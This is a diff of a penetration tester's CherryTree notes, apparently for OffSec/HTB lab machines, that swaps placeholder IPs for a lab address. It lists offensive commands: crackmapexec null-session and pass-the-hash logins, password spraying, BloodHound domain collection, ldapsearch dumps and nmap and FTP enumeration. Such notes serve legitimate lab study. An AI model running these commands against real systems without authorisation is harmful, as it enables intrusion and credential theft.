-          <codebox char_offset="150" justification="left" frame_width="610" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> crackmapexec smb 10.11.1. --shares
+crackmapexec smb 192.168.162.122 -u admin -p abcd1234 --shares</codebox>
+          <codebox char_offset="120" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.162.122 -u admin -H reallybighashvalue</codebox>
+          <codebox char_offset="150" justification="left" frame_width="610" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> crackmapexec smb 192.168.162.122 --shares
  </codebox>
-          <codebox char_offset="190" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1. --shares -u '' -p ''</codebox>
-          <codebox char_offset="230" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1. --shares -u 'randomanon' -p ''</codebox>
-          <codebox char_offset="238" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1. -u admin -H reallybighashvalue</codebox>
+          <codebox char_offset="190" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.162.122 --shares -u '' -p ''</codebox>
+          <codebox char_offset="230" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.162.122 --shares -u 'randomanon' -p ''</codebox>
+          <codebox char_offset="238" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.162.122 -u admin -H reallybighashvalue</codebox>
           <codebox char_offset="263" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> Crackmapexec -d domain.local -u username -p password --shares</codebox>
           <codebox char_offset="264" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
 </codebox>
-          <codebox char_offset="307" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1. -U validuser.txt -P password.txt -M spider-plus </codebox>
+          <codebox char_offset="307" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 192.168.162.122 -U validuser.txt -P password.txt -M spider-plus </codebox>
           <codebox char_offset="308" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
-          <codebox char_offset="405" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">  crackmapexec smb 10.11.1.  -U validuser.txt -P password.txt -M spider-plus --no-bruteforce</codebox>
+          <codebox char_offset="405" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">  crackmapexec smb 192.168.162.122  -U validuser.txt -P password.txt -M spider-plus --no-bruteforce</codebox>
         </node>
         <node name="Using Bloodhound" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690408" ts_lastsave="1687725851">
           <rich_text scale="h3">Upload sharphound and run the following if u are on a non domain joined system in powershell</rich_text>
@@ -1792,14 +1856,14 @@ where </rich_text>
 
 
 where -c is for collection all</rich_text>
-          <codebox char_offset="94" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe -c all -d domain.local --domaincontroller 10.11.1.</codebox>
+          <codebox char_offset="94" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe -c all -d domain.local --domaincontroller 192.168.162.122</codebox>
           <codebox char_offset="127" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe</codebox>
           <codebox char_offset="599" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo apt install bloodhound.py</codebox>
-          <codebox char_offset="608" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">python3 bloodhound.py --dns-tcp -ns 10.11.1. -d support.htb -u ‘ldap’ -p ‘password’</codebox>
-          <codebox char_offset="616" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 10.11.1. -d support.htb -u ‘ldap’ -p ‘password’</codebox>
-          <codebox char_offset="681" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 10.11.1. -d support.htb -u ‘ldap’ -p ‘password’ -c all</codebox>
+          <codebox char_offset="608" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">python3 bloodhound.py --dns-tcp -ns 192.168.162.122 -d support.htb -u ‘ldap’ -p ‘password’</codebox>
+          <codebox char_offset="616" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 192.168.162.122 -d support.htb -u ‘ldap’ -p ‘password’</codebox>
+          <codebox char_offset="681" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 192.168.162.122 -d support.htb -u ‘ldap’ -p ‘password’ -c all</codebox>
         </node>
-        <node name="ldapsearch" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690428" ts_lastsave="1687814759">
+        <node name="ldapsearch" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690428" ts_lastsave="1687809042">
           <rich_text scale="h3">Using Ldapsearch</rich_text>
           <rich_text>
 
@@ -1807,47 +1871,27 @@ where -c is for collection all</rich_text>
           <rich_text justification="left"></rich_text>
           <rich_text>
 
-or 
-
-Without any user:
-
-</rich_text>
-          <rich_text justification="left"></rich_text>
-          <rich_text>
-
-
-once u have the output make sure u check log file for 
-
-1.  </rich_text>
-          <rich_text weight="heavy">Passwords</rich_text>
-          <rich_text> via :
-   
-2.  </rich_text>
-          <rich_text weight="heavy">Usernames</rich_text>
-          <rich_text> Via:
-   
+or
 </rich_text>
           <codebox char_offset="18" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -h support.htb -D ‘ldap@support.htb’ -w 'password' -b 'dc=support,dc=htb'</codebox>
-          <codebox char_offset="45" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> ldapsearch -x -b "dc=hutch,dc=offsec" -H ldap://10.11.1. | tee ldapSearch.log  </codebox>
-          <codebox char_offset="128" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cat ldapSearch.log| grep -i password</codebox>
-          <codebox char_offset="152" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
+          <codebox char_offset="24" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -x -h 192.168.162.122 -b "dc=hutch,dc=offsec"</codebox>
         </node>
       </node>
       <node name="nmap" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686543" ts_lastsave="1687686592">
         <rich_text underline="single" weight="heavy">Network Scanning</rich_text>
         <rich_text>
 
-   ☐  nmap -sn 10.11.1.
-   ☐  nmap -sL 10.11.1.
-   ☐  nbtscan -r 10.11.1.
+   ☐  nmap -sn 192.168.162.122
+   ☐  nmap -sL 192.168.162.122
+   ☐  nbtscan -r 192.168.162.122
 
 </rich_text>
         <rich_text underline="single" weight="heavy">Individual Host Scanning</rich_text>
         <rich_text>
 
    ☐  nmap  --top-ports 20 --open -iL iplist.txt
-   ☐  nmap -sS -A -sV -O -p- 10.11.1.
-   ☐  nmap -sU 10.11.1.
+   ☐  nmap -sS -A -sV -O -p- 192.168.162.122
+   ☐  nmap -sU 192.168.162.122
 </rich_text>
       </node>
       <node name="FTP" unique_id="37" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687687069" ts_lastsave="1687687497">
@@ -1872,9 +1916,9 @@ Connecting:
 
 </rich_text>
         <rich_text justification="left"></rich_text>
-        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> nmap -Pn -n -vvv -p21 -sC -sV 10.11.1.</codebox>
-        <codebox char_offset="35" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wget -r 'ftp://&lt;username&gt;:&lt;password&gt;@10.11.1.'</codebox>
-        <codebox char_offset="52" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ftp -A 10.11.1.</codebox>
+        <codebox char_offset="7" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> nmap -Pn -n -vvv -p21 -sC -sV 192.168.162.122</codebox>
+        <codebox char_offset="35" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">wget -r 'ftp://&lt;username&gt;:&lt;password&gt;@192.168.162.122'</codebox>
+        <codebox char_offset="52" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ftp -A 192.168.162.122</codebox>
       </node>
       <node name="PrivEsc" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689966" ts_lastsave="1687689975">
         <node name="Linux" unique_id="43" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689975" ts_lastsave="1687689978">
